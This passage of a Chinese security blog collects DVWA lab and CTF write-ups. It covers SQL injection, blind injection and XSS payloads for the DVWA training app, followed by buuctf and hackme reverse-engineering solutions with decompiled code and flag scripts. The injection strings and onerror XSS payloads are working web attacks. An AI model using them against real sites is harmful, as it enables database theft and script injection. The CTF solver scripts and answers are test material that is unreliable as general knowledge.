medium级别\n\n本题只能选择再提交，所以选择抓包的方式进行数据包修改参数id\n\n![QMzIzV.png](https://s2.ax1x.com/2019/12/03/QMzIzV.png)\n\n更改成1‘ and 1=2 #，出现报错，说明不是字符型注入\n\n![QQpM1x.png](https://s2.ax1x.com/2019/12/03/QQpM1x.png)\n\n尝试数字型注入，1 and 1=1#，回显正常，找到注入点\n\n![QQpN4A.png](https://s2.ax1x.com/2019/12/03/QQpN4A.png)\n\n剩下爆数据库，表名可参考low级别payload\n\n\n\n#### high级别\n\n与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，控制只输出一个结果。\n\n`1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #`\n\n![QQ90i9.png](https://s2.ax1x.com/2019/12/03/QQ90i9.png)\n\nHigh级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。\n\n\n\n### SQL Injection (Blind)\n\n#### low级别\n\n只会显示exists和MISSING，其中exists代表查询正确，MISSING代表查询错误\n\n![QQCEFJ.png](https://s2.ax1x.com/2019/12/03/QQCEFJ.png)\n\n开始尝试数据库名长度，使用语句` 1' and length(database())=1#`，发现不成功一直到4回显exists，表明数据库名长度为4\n\n![QQPg4H.png](https://s2.ax1x.com/2019/12/03/QQPg4H.png)\n\n开始猜测数据库名，`1' and ascii(substr(database(),1,1))>97#`和`1' and ascii(substr(database(),1,1))<123#`判断第一个字母是否在a-z中间，返回都是exists\n\n![QQPjvq.png](https://s2.ax1x.com/2019/12/03/QQPjvq.png)\n\n接着用二分法证实得第一个字母为d。同理求出完整数据库名为 dvwa\n\n之后开始猜有几个表，猜解表的长度，猜解表的名称\n\n猜测表个数`1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2#`，为2。\n\n![QQiJMt.png](https://s2.ax1x.com/2019/12/03/QQiJMt.png)\n\n猜第一个表名，从第一位开始猜，二分法，可用以下语句尝试，最后得到表1完整名称是guestbook\n\n`1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=103#`\n\n猜第二个表名，用以下语句尝试，得到表2的名称是users\n\n`1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1))=117#`\n\n以后按照以上类似方法就可得到字段值，不再累述\n\n### medium级别\n\n![QQE1Tf.png](https://s2.ax1x.com/2019/12/03/QQE1Tf.png)\n\n查看源码\n\n```php\n<?php\nif( isset( $_POST[ 'Submit' ]  ) ) {\n    // Get input\n    $id = $_POST[ 'id' ];\n    $id = ((isset($GLOBALS[\"___mysqli_ston\"]) && is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"],  $id ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\"));\n    // Check database\n    $getid  = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $getid ); // Removed 'or die' to suppress mysql errors\n    // Get results\n    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors\n    if( $num > 0 ) {\n        // Feedback for end user\n        echo '<pre>User ID exists in the database.</pre>';\n    }\n    else {\n        // Feedback for end user\n        echo '<pre>User ID is MISSING from the database.</pre>';\n    }\n    //mysql_close();\n}\n?>\n```\n\n相比low级别添加了`mysqli_real_escape_string()`，过滤了一些单引号等字符，并使用post方法发送数据。但此题没有涉及字符型注入，所以直接构造语句\n\n`1 and length(database())=4#`\n\n盲注方法参照low级别，不再累述\n\n#### high级别\n\n![QQVX24.png](https://s2.ax1x.com/2019/12/03/QQVX24.png)\n\n查看源代码\n\n```php\n<?php\nif( isset( $_COOKIE[ 'id' ] ) ) {\n    // Get input\n    $id = $_COOKIE[ 'id' ];\n\n    // Check database\n    $getid  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\";\n    $result = mysqli_query($GLOBALS[\"___mysqli_ston\"],  $getid ); // Removed 'or die' to suppress mysql errors\n\n    // Get results\n    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors\n    if( $num > 0 ) {\n        // Feedback for end user\n        echo '<pre>User ID exists in the database.</pre>';\n    }\n    else {\n        // Might sleep a random amount\n        if( rand( 0, 5 ) == 3 ) {\n            sleep( rand( 2, 4 ) );\n        }\n        // User wasn't found, so the page wasn't!\n        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );\n        // Feedback for end user\n        echo '<pre>User ID is MISSING from the database.</pre>';\n    }\n    ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);\n}\n?>\n```\n\nHigh级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。由于时间盲注的准确性受到影响，所以只利用基于布尔的盲注\n\n`抓包将cookie中参数id改为1' and length(database())=4 #，显示存在`\n\n\n\n### XSS（Reflected）\n\n#### Low级别\n\n![QdOxwn.png](https://s2.ax1x.com/2019/12/09/QdOxwn.png)\n\n直接引用了name参数，并没有任何的过滤和检查，存在明显的XSS漏洞，输入`<script>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### Medium级别\n\n![image.png](https://i.loli.net/2019/12/09/iSgKGcIHMwzAYeu.png)\n\n对输入进行了过滤，使用str_replace函数将输入中的`<script>`删除输入`<sc<script>ript>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### High级别\n\n![image.png](https://i.loli.net/2019/12/09/U6SQV1OoLYbFuGx.png)\n\npreg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效，可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。\n\n输入`<img src=1 onerror=alert(/xss/)>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n\n\n### XSS（Stored）\n\n#### Low级别\n\n![image.png](https://i.loli.net/2019/12/09/fBI6OXJDlbukiFA.png)\n\n对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。message一栏输入`<script>alert(/xss/)</script>`，成功弹框：\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### Medium级别\n\n![image.png](https://i.loli.net/2019/12/09/MgtfzTHRmNqjuGy.png)\n\n由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。\n\n抓包改name参数为`<sc<script>ript>alert(/xss/)</script>`，成功弹窗\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n#### High级别\n\n![image.png](https://i.loli.net/2019/12/09/EfIJ4uLP1rKwhkM.png)\n\n使用正则表达式过滤了`<script>`标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS\n\n抓包改name参数为`<img src=1 onerror=alert(/xss/)>`，成功\n\n![image.png](https://i.loli.net/2019/12/09/LPAXSafjuWCTqlK.png)\n\n","tags":["漏洞复现"]},{"title":"buuctf Youngter-drive","url":"/2019/11/08/drive/","content":"\n查壳upx壳，直接拖入kali `upx -d`脱壳，尝试运行无果，拖入ida F5\n\n[![MZbZO1.png](https://s2.ax1x.com/2019/11/08/MZbZO1.png)](https://imgchr.com/i/MZbZO1)\n\n```c\nint sub_411BD0()\n{\n  printf(\n    \"1111111111111111111111111111111111111111111111111111111111111111111111111111111\\n\"\n    \"*******************************************************************************\\n\"\n    \"**************             ****************************************************\\n\"\n    \"**************   ********   *********************                 *************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *********  *********************   ***************************\\n\"\n    \"**************   *******   **********************   ***************************\\n\"\n    \"**************   ****   *************************   ***************************\\n\"\n    \"**************   *    ***************************                **************\\n\"\n    \"**************   ***    *************************   ***************************\\n\"\n    \"**************   ******   ***********************   ***************************\\n\"\n    \"**************   ********   *********************   ***************************\\n\"\n    \"**************   **********   *******************   ***************************\\n\"\n    \"**************   ***********    *****************                 *************\\n\"\n    \"*******************************************************************************\\n\"\n    \"1111111111111111111111111111111111111111111111111111111111111111111111111111111\\n\");\n  printf(\"input flag:\\n\");\n  return scanf(\"%36s\", &Source);\n}\n```\n\n`sub_411BD0`函数是把输入的 flag 存到全局缓冲区 `Source` 里面，而且最多只存 36 个字符\n\n由API可知这道题涉及到多线程，`CreateThread` API 会创建新线程，`CreateMutex` 创建一个互斥变量，用于防止多线程中出现资源争用，此变量存于全局句柄`::hObject`中。创建了两线程`StartAddress`、`sub_41119F`，跟进查看，两者代码相似，区别在与`StartAddress`中的一句`sub_41112C(&Source, dword_418008);`。两者交替执行，直至`dword_418008 > -1`。\n\n```c\nvoid __stdcall StartAddress_0(int a1)\n{\n  while ( 1 )\n  {\n    WaitForSingleObject(hObject, 0xFFFFFFFF);\n    if ( dword_418008 > -1 )\n    {\n      sub_41112C(&Source, dword_418008);\n      --dword_418008;\n      Sleep(0x64u);\n    }\n    ReleaseMutex(hObject);\n  }\n}\n\n\nvoid __stdcall sub_411B10(int a1)\n{\n  while ( 1 )\n  {\n    WaitForSingleObject(hObject, 0xFFFFFFFF);\n    if ( dword_418008 > -1 )\n    {\n      Sleep(0x64u);\n      --dword_418008;\n    }\n    ReleaseMutex(hObject);\n  }\n}\n```\n\n跟入`sub_41112C`却警告`positive sp value has been found`，百度得知是栈平衡缺失所导致的问题（函数调用前的sp值与调用结束的sp值不相同），可手动调整sp值解决。\n\n\n\n[![MZLlMd.png](https://s2.ax1x.com/2019/11/08/MZLlMd.png)](https://imgchr.com/i/MZLlMd)\n\n在 选项 -> 常规中勾选堆栈指针，即可在地址旁显示sp的值\n\n[![MZLoe1.png](https://s2.ax1x.com/2019/11/08/MZLoe1.png)](https://imgchr.com/i/MZLoe1)\n\n调到警告处，可发现sp值确实发生了偏差，在sp值为0时，又运行了`pop edp`这条语句导致栈不平衡\n\n[![MZOFfS.png](https://s2.ax1x.com/2019/11/08/MZOFfS.png)](https://imgchr.com/i/MZOFfS)\n\n在`00411A03`使用快捷键`Alt+k`，将新旧sp差值改为0x0，修改完成后即可F5得到伪代码\n\n![1573222975119](C:\\Users\\12424\\AppData\\Roaming\\Typora\\typora-user-images\\1573222975119.png)\n\n此函数就是加密函数，参数`a1`为缓冲区Source地址，`a2`为常量`dword_418008`，值为29，线程每执行一次减一，两线程公用。`sub_411940`判断了字符是不是字母再变换，大写字母变换成 `off_418000[0][*(_BYTE *)(a2 + a1) - 38]`，小写字母变换成 `off_418000[0][*(_BYTE *)(a2 + a1) - 96]`， `off_418000[0]` 是一个字符串，内容是 `QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm`。注意是两线程交替执行，所以**只会有一半的字符改变**。\n\n```c\nchar *__cdecl sub_411940(int a1, int a2)\n{\n  char *result; // eax\n  char v3; // [esp+D3h] [ebp-5h]\n\n  v3 = *(_BYTE *)(a2 + a1);\n  if ( (v3 < 97 || v3 > 122) && (v3 < 65 || v3 > 90) )\n    exit(0);\n  if ( v3 < 97 || v3 > 122 )\n  {\n    result = off_418000[0];\n    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38];\n  }\n  else\n  {\n    result = off_418000[0];\n    *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96];\n  }\n  return result;\n}\n```\n\n看到`sub_411190()`,此函数用经变换过后的`Source`与`off_418004[]`逐位对比，`off_418004[]`内容为`TOiZiZtOrYaToUwPnToBsOaOapsyS`\n\n```c\nint sub_411880()\n{\n  int i; // [esp+D0h] [ebp-8h]\n\n  for ( i = 0; i < 29; ++i )\n  {\n    if ( Source[i] != off_418004[i] )\n      exit(0);\n  }\n  return printf(\"\\nflag{%s}\\n\\n\", Dest);\n}\n```\n\n结合以上分析给出以下脚本\n\n```python\noff_418000 = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"\n\noff_418004 = \"TOiZiZtOrYaToUwPnToBsOaOapsyS\"\n\nflag=''\n\nfor i in range(len(off_418004)):\n    if i %2 == 0:\n        flag += off_418004[i]\n        continue\n    for j,k in enumerate(off_418000):\n        if off_418004[i] == k:\n            if chr(j+38).isupper():\n                flag += chr(j+38)\n            else:\n                flag += chr(j+96)\n\nprint (flag)\n```\n\n但得出的flag提交发现不正确，百度知道还需添加一个字符`E`才能通过。之后发现变换后的字符串末尾应该有结束符，所以输入的 flag 应该比变换后的字符串多一个字符，因为多出来的那个字符经过变换会变成结束符。","tags":["buuctf"]},{"title":"buuctf re 简单注册器","url":"/2019/11/02/注册器/","content":"\n又是一道Android题，，用`dex2jar`和`jd-gui`可直接获得MainActivity源码 (参考前一篇Android博客\n\n![KOSYxH.png](https://s2.ax1x.com/2019/11/02/KOSYxH.png)\n\n分析大致流程：给定字符串，一系列变换后，逆序输出即为flag\n\n```python\na = 'dd2940c04462b4dd7c450528835cca15'\na = list(a)\na[2] = chr(ord(a[2]) + ord(a[3]) - ord('2'))\na[4] = chr(ord(a[2]) + ord(a[5]) - ord('0'))\na[30] = chr(ord(a[31]) + ord(a[9]) - ord('0'))\na[14] = chr(ord(a[27]) + ord(a[28]) - ord('a'))\n\nprint('flag{'+''.join(a[::-1])+'}')\n```\n\n","tags":["buuctf"]},{"title":"buuctf re crackrtf","url":"/2019/11/02/crackrtf/","content":"\nida打开 F5\n\n![Kqitud.png](https://s2.ax1x.com/2019/11/02/Kqitud.png)\n\n程序分为两部分输入，第一次输入后，将输入的字符串通过`atoi()`转换成整型，之后`strcat()`函数与`@DBApp`连接代入`sub_40100A`函数，跟进此函数\n\n![KqFpxe.png](https://s2.ax1x.com/2019/11/02/KqFpxe.png)\n\n推测此函数为hash加密函数，通过对CryCreateHash函数的了解，查询其中一参数ALG_ID 0x8004，得到此函数为sha1算法\n\n![KqFmRS.png](https://s2.ax1x.com/2019/11/02/KqFmRS.png)\n\n可利用python的hashlib对第一段输入进行爆破求解，结果为 123321\n\n```python\nimport hashlib\nflag2 = '@DBApp'\nfor i in range(100000,999999):\n\th2 = hashlib.sha1(str(i)+flag2)\n\tflags = h2.hexdigest()\n\tif(\"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower() == flags):\n\t\tprint(str(i))\n```\n\n将结果输入程序，通过验证，进入第二次输入\n\n将输入与之前12位字符连接，代入`sub_401019`，经查询此函数为MD5算法，由于没有足够的信息，对其爆破难度大，放弃此方法。发现下文还有一判断函数`sub_40100F`，跟进\n\n![KqFXLj.png](https://s2.ax1x.com/2019/11/02/KqFXLj.png)\n\nAPI函数`FindResourceA`查找文件中包含名为AAA的文件，通过`sub_401005`把AAA的文件中取出字符和输入的字符串进行异或得到一个.rtf文件，通过`ResourceHacker`这个软件查看包含文件AAA\n\n![KqkB6g.png](https://s2.ax1x.com/2019/11/02/KqkB6g.png)\n\n因为需要得到的只有前6/18位字符，所以可通过rtf文件头的格式对前6位字符进行还原\n\n随便创建一个rtf文件，用winhex打开，即可得到文件头前6位“{\\\\\\rtf1”，注意 \\ 还需要一个 \\ 进行转义\n\n![KqAMEn.png](https://s2.ax1x.com/2019/11/02/KqAMEn.png)\n\n```python\ns = [0x05,0x7D,0x41,0x15,0x26,0x01] \na = '{\\\\rtf1'\nflag = ''\nfor i in range(len(a)):\n    flag += chr(ord(a[i])^s[i])\nprint(flag)\n```\n\n得到前6位字符为`~!3a@0`，输入程序，程序运行结束即可在当前目录下生成dbapp.rtf文件，打开得到flag","tags":["buuctf"]},{"title":"buuoj findit 初探Android逆向","url":"/2019/10/25/buuoj findit 安卓逆向/","content":"\n这题给的是一个`apk文件`，刚接触安卓，简要学习了一下安卓逆向的大致流程\n\n**反编译代码**的工具下载：\n\n- dex2jar: 把`dex文件`转成`jar文件`下载地址：https://sourceforge.net/projects/dex2jar/files/\n- jd-gui: 这个工具用于将`jar文件`转换成`java代码`下载地址：http://jd.benow.ca/\n\n**反编译资源**的工具：\n\n- APKTool: APK逆向工具，使用简单下载地址: http://ibotpeaches.github.io/Apktool/install/\n- 简单介绍下大概流程，首先把后缀为`.apk`的文件改为`.zip`的一个压缩文件，方便解压。`dex2jar`和`jd-gui`配套使用，用于逆向代码部分，`APKTool`用于逆向res文件夹下的图片布局等部分。`.apk` 修改成.zip文件解压后的目录树长这样：\n\n![KdPb28.png](https://s2.ax1x.com/2019/10/25/KdPb28.png)\n\n### 反编译代码\n\n用到`dex2jar包`中三个文件`d2j_invoke.bat`, `d2j-dex2jar.bat`, `lib`，将上面解压的`classes.dex文件`和这三个文件一起复制到同一文件夹。\n\n在当前窗口运行`d2j-dex2jar.bat classes.dex`，即可得到`classes-dex2jar.jar`文件\n\n[![KdiUit.png](https://s2.ax1x.com/2019/10/25/KdiUit.png)](https://imgchr.com/i/KdiUit)\n\n再运行`jd-gui`，将`classes-dex2jar.jar`拖入，即可得到想要的 java 代码\n\n![Kdi7w9.png](https://s2.ax1x.com/2019/10/25/Kdi7w9.png)\n\n### 反编译res资源部分\n\napktool跟着官网的安装步骤即可完成安装\n\n在find.apk文件目录下cmd运行 `apktool find.apk`可得到同名文件夹\n\n这个文件夹下会得到若干文件，主要内容介绍如下：\n\n- AndroidManifest.xml：描述文件\n- res：资源文件\n- smail：反编译出来的所有代码，语法与java不同，类似汇编，是Android[虚拟机](https://www.52pojie.cn/thread-661779-1-1.html)所使用的寄存器语言\n\n![KdFJ6U.png](https://s2.ax1x.com/2019/10/25/KdFJ6U.png)\n\n查看`MainActivity.smali`文件，得到以下关键信息，结合`.line 22` 和`.line 23`可知两串字符串分别对应上面java代码中的`arrayOfChar1`和`arrayOfChar2`\n\n```smali\n    .line 22\n    :array_0\n    .array-data 2\n        0x54s\n        0x68s\n        0x69s\n        0x73s\n        0x49s\n        0x73s\n        0x54s\n        0x68s\n        0x65s\n        0x46s\n        0x6cs\n        0x61s\n        0x67s\n        0x48s\n        0x6fs\n        0x6ds\n        0x65s\n    .end array-data\n\n    .line 23\n    nop\n\n    :array_1\n    .array-data 2\n        0x70s\n        0x76s\n        0x6bs\n        0x71s\n        0x7bs\n        0x6ds\n        0x31s\n        0x36s\n        0x34s\n        0x36s\n        0x37s\n        0x35s\n        0x32s\n        0x36s\n        0x32s\n        0x30s\n        0x33s\n        0x33s\n        0x6cs\n        0x34s\n        0x6ds\n        0x34s\n        0x39s\n        0x6cs\n        0x6es\n        0x70s\n        0x37s\n        0x70s\n        0x39s\n        0x6ds\n        0x6es\n        0x6bs\n        0x32s\n        0x38s\n        0x6bs\n        0x37s\n        0x35s\n        0x7ds\n    .end array-data\n```\n\n分析java代码，判断对`arrayOfChar2`中字母进行凯撒加密，爆破脚本如下\n\n```python\nmodel = \"abcdefghijklmnopqrstuvwxyz\"\n\nstr1 = \"pvkq{m164675262033l4m49lnp7p9mnk28k75}\"\n\nfor i in range(1,27):\n    for s in str1:\n        if s.isalpha():\n            n = model.find(s)\n            s = model[n-i]\n        print(s, end='')\n    print('\\n')\n```\n\n![KdkfrF.png](https://s2.ax1x.com/2019/10/25/KdkfrF.png)\n\n","tags":["buuctf"]},{"title":"hackme_re部分wp","url":"/2019/10/06/hackme-re/","content":"\n### helloworld\n\n```c\n  v4 = 3363956977;\n  v5 = 3469705682;\n  v6 = 2176877013;\n  v7 = 3369451731;\n  v8 = 3451965390;\n  v9 = 3436498817;\n  v10 = 2413020355;\n  v11 = 0;\n  printf(\"What is magic number? \");\n  __isoc99_scanf(\"%d\", &v12);\n  if ( v12 == 314159265 )\n  {\n    for ( i = 0; *((_BYTE *)&v4 + i); ++i )\n      *((_BYTE *)&v4 + i) ^= v12;\n    printf(\"Flag is FLAG{%s}\\n\", &v4);\n  }\n  else\n  {\n    puts(\"Try Hard.\");\n  }\n  return 0;\n}\n```\n\n\n\n### simple\n\n```python\na = 'UIJT.JT.ZPVS.GMBH'\nh=''\nfor i in a:\n    h += chr(ord(i)-1)\nprint(h)\n```\n\n### passthis\n\n![uckWad.png](https://s2.ax1x.com/2019/10/06/uckWad.png)\n\n```python\na=[0xC1,0xCB,0xC6,0xC0,0xFC,0xC9,0xE8,0xAB,0xA7,0xDE,0xE8,0xF2,0xA7,0xF4,0xEF,0xE8,0xF2,0xEB,0xE3,0xA7,0xE9,0xE8,0xF3,0xA7,0xF7,0xE6,0xF4,0xF4,0xA7,0xF3,0xEF,0xE2,0xA7,0xE1,0xEB,0xE6,0xE0,0xFA]\ns=''\nfor i in a:\n    s += chr(i^135)\nprint(s)\n```\n\n\n\n### pyyy\n\n`uncompyle6 pyyy.pyc > pyyy.py`可直接将pyc文件反编译出py源码，打开\n\n```python\n# uncompyle6 version 3.4.0\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)]\n# Embedded file name: pyyy.py\n# Compiled at: 2016-06-12 01:14:31\n__import__('sys').setrecursionlimit(1048576)\ndata = 'Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h96wRZDv1dSK/f1vz+mUeUyUlFY0iMjfw5eBXWZppNZi3ZtJcq5kllM2ACVFcxQWI3azM3ArOcqjosoiPjNoDYgKh7w4k2Cd0kLYEHscz/njtJ1KEcwLtqs4nJ+gB2r4V9g03YgvY5E8JJtfJMKdaTedjtvEuif8FNlCK9DMnL1iLpWptJbdfO83Y7Y46XCqjZFBI5o9Qtb78nLhMEM5/YTaNOM/wE/oJl5HI/i1X6kW3PKCsVubRkOkc2xawl6NYdLETjLvmrGhhI'\na = 138429774382724799266162638867586769792748493609302140496533867008095173455879947894779596310639574974753192434052788523153034589364467968354251594963074151184337695885797721664543377136576728391441971163150867881230659356864392306243566560400813331657921013491282868612767612765572674016169587707802180184907L\nb = 166973306488837616386657525560867472072892600582336170876582087259745204609621953127155704341986656998388476384268944991674622137321564169015892277394676111821625785660520124854949115848029992901570017003426516060587542151508457828993393269285811192061921777841414081024007246548176106270807755753959299347499L\nc = 139406975904616010993781070968929386959137770161716276206009304788138064464003872600873092175794194742278065731836036319691820923110824297438873852431436552084682500678960815829913952504299121961851611486307770895268480972697776808108762998982519628673363727353417882436601914441385329576073198101416778820619L\nd = 120247815040203971878156401336064195859617475109255488973983177090503841094270099798091750950310387020985631462241773194856928204176366565203099326711551950860726971729471331094591029476222036323301387584932169743858328653144427714133805588252752063520123349229781762269259290641902996030408389845608487018053L\ne = 104267926052681232399022097693567945566792104266393042997592419084595590842792587289837162127972340402399483206179123720857893336658554734721858861632513815134558092263747423069663471743032485002524258053046479965386191422139115548526476836214275044776929064607168983831792995196973781849976905066967868513707L\nF = (a, b, c, d, e)\nm = 8804961678093749244362737710317041066205860704668932527558424153061050650933657852195829452594083176433024286784373401822915616916582813941258471733233011L\ng = 67051725181167609293818569777421162357707866659797065037224862389521658445401L\nz = []\nfor i, f in enumerate(F):\n    n = pow(f, m, g)\n    this_is = 'Y-Combinator'\n    l = (lambda f: (lambda x: x(x))(lambda y: f(lambda *args: y(y)(*args))))(lambda f: lambda x: 1 if x < 2 else f(x - 1) * x % n)(g % 27777)\n    c = raw_input('Channenge #%d:' % i)\n    if int(c) != l:\n        print 'Wrong~'\n        exit()\n    z.append(l)\nz.sort()\ngg = '(flaSg\\'7 \\\\h#GiQwt~66\\x0csxCN]4sT{? Zx YCf6S>|~`\\x0c$/}\\'\\r:4DjJFvm]([sP%FMY\"@=YS;CQ7T#zx42#$S_j0\\\\Lu^N31=r\\x0b\\t\\tjVhhb_KM$|6]\\nl!:V\\rx8P[0m ;ho_\\rR(0/~9HgE8!ec*AsGd[e|2&h!}GLGt\\'=$\\x0cbKFMnbez-q\\\\`I~];@$y#bj9K0xmI2#8 sl^gBNL@fUL\\x0b\\\\9Ohf]c>Vj/>rnWXgLP#<+4$BG@,\\'n a_7C:-}f(WO8Y\\x0c2|(nTP!\\'\\\\>^\\'}-7+AwBV!w7KUq4Qpg\\tf.}Z7_!m+ypy=`3#\\\\=?9B4=?^}&\\'~ Z@OH8\\n0=6\\x0b\\tv\\nl!G\\'y4dQW5!~g~I*f\"rz1{qQH{G9\\x0c\\'b\\x0cp\\x0bdu!2/\\\\@i4eG\"If0A{-)N=6GMC<U5/ds\\rG&z>P1\\nsq=5>dFZUWtjv\\tX~^?9?Irwx\\\\5A!32N\\x0bcVkx!f)sVY Men\\x0c\\'ujN<\"LJ\\x0c5R4\"\\\\\\\\XPVA\\'m$~tj)Br}C}&kX2<|\\np3XtaHB.P\\'(E 4$dm!uDyC%u [\"x[VYw=1aDJ (8V/a!J?`_r:n7J88!a25AZ]#,ab?{%e\\x0b]wN_}*Q:mh>@]u\\t&6:Z*Fmr?U`cOHbAf7s@&5~L ,\\tQ18 -Hg q2nz%\\x0ccUm=dz&h1(ozoZ)mrA=`HKo\\n\\'rXm}Z-l3]WgN\\\\NW<{o=)[V({7<N1.-A8S\"=;3sderb\\tOZ$K\\r0o/5\\x0bMc76EGCWJ3IQpr7!QhbgzX8uGe3<w-g\\'/j\\'\\tM4|9l?i&tm_\\n57X0B2rOpuB@H@%L_\\r)&/q=LZa(%}\"\"#if#Kq74xK?`jGFOn\"8&^3Q-\\r#]E$=!b^In0:$4VKPXP0UK=IK)Y\\rstOT40=?DyHor8j7O\\\\r/~ncJ5];cCT)c?OS0EM5m#V(-%\"Tu:!UsE],0Dp  s@HErS]J{%oH54B&(zE.(@5#2k\\tJnNlnUEij\\\\.q/3HBpJNk*X(k5;DlqK\\'\\'fX\\r}EBk_7\\x0b:>8~\\t+M@WJx.PO({/U}1}#TqjreG\\nN{\\rX>4EsJr0Pn\\\\Z\\\\aL/-U<<{,Q;j\\tF=7f\\')+wH:p{G=_.s\\\\t-\\x0bI\\x0c*y\\t1P:Y|/2xE<uo]~$>5k]FW+>fR<QA\"(Fj[LL(hzfQo#PJ;:*0kB~3]9uL[o.xue:VQ\\t;9-Tu\\tq|mzzhV_okP\\t,d\\rQ`]5Gf\\x0c#gXB\\x0cAH|)NI|K=KW-&p-<b\"3e.rO\\x0cuK=\\x0c^\\r+MuLxCJ`UKaD\\x0bBH&n+YVajZ(U7pwWtto3T10VLHwSJ\\rK\\t}\\'F$l1:b2Bd\\na=#t0iq}#!{1_)w$}<Dp(borC\\'\\t?r6;,+k;a(Q3@B?RCWYEDrjZe![x=n_%S]rl{&fLr*mgCD;92/nNsaxKy/;\\nr]sPK=`+YP>MmfB\\n8O4/\"}nE7r*=41f2\\t37>K\\'s$wpl;qS[`qzu\\x0b\\t\\nuaU|b,C`4& dRN~]7DnuTb2FhNHV!#Z2Hho\\x0b[%.{O\\t$q0\\x0ch_@?w@b8[I^{JL|O8]i8{p)A.w)14qK3JoyF%licZ~ga\\rW[L:W\\rtIvfWJjZUOvB\\rS.Beav3!-@bw|PexJ Pcw1\\ry6!63B}]J])6fak/3r]W\\tMeXt[uc(1_U lys{a1X\\r%)[wwP3rhgNW{*d~_E%Q2htCt5ha@l0^0=\\x0bwT\\ni4/V;_\\nM1rb?w~Q)Dli4u\\n`}1+D8\"\\t`@V~$9l$Uy**VnI 